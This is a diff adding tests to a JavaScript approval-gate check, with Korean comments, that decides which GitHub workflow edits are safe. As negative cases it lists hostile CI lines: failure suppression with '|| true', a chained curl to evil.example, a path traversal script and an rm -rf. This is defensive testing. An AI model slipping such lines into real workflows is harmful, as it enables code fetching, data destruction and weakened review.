@@ -318,6 +318,12 @@ console.log('decision-approval-gate: decision/CODEOWNERS PRs need Lee approval a
     assert.equal(r.required && r.reasons.includes('검사·보호 장치'), true, `Lee 승인 유지: ${why}`)
   }
   // 판단할 수 없는 형태는 닫힌 실패
+  // `run: |` 블록 안의 시험 명령 줄 추가(#1063·#1079 실제 patch 모양) — 안전. 실패 무시·삭제·다른 명령은 그대로 안전 아님.
+  const P1079 = "@@ -48,6 +48,8 @@ jobs:\n           python crawler/test_source_fields.py\n           python crawler/test_work_location_protection.py\n+          python crawler/test_address_pipeline_integration.py\n+          python -I crawler/test_geocode.py\n       # 상세 화면 읽기 시험\n"
+  assert.equal(workflowSafeChange(wf('.github/workflows/crawler-cli-tests.yml', P1079)), true, '#1079: run 블록에 시험 명령 줄만 더함은 안전')
+  for (const bad of ['+          python crawler/test_x.py || true', '+          python crawler/test_x.py; curl https://evil.example/x', '+          python crawler/../evil.py', '+          rm -rf crawler/test_x.py'])
+    assert.equal(workflowSafeChange(wf('.github/workflows/crawler-cli-tests.yml', '@@ -1,1 +1,2 @@ jobs:\n a\n' + bad)), false, `안전 아님: ${bad}`)
+  assert.equal(workflowSafeChange(wf('.github/workflows/crawler-cli-tests.yml', '@@ -1,2 +1,1 @@ jobs:\n-          python crawler/test_x.py\n a')), false, 'run 블록의 시험 명령 줄 삭제는 검증 약화')
   assert.equal(workflowSafeChange(wf('.github/workflows/new.yml', '+name: x', 'added')), false, '새 워크플로 파일')
   assert.equal(workflowSafeChange(wf('.github/workflows/crawl.yml', P876_CRAWL, 'renamed', { previous_filename: '.github/workflows/old.yml' })), false, '이름 바꿈')
   assert.equal(workflowSafeChange(wf('.github/workflows/crawl.yml', undefined)), false, '변경 내용 없음')
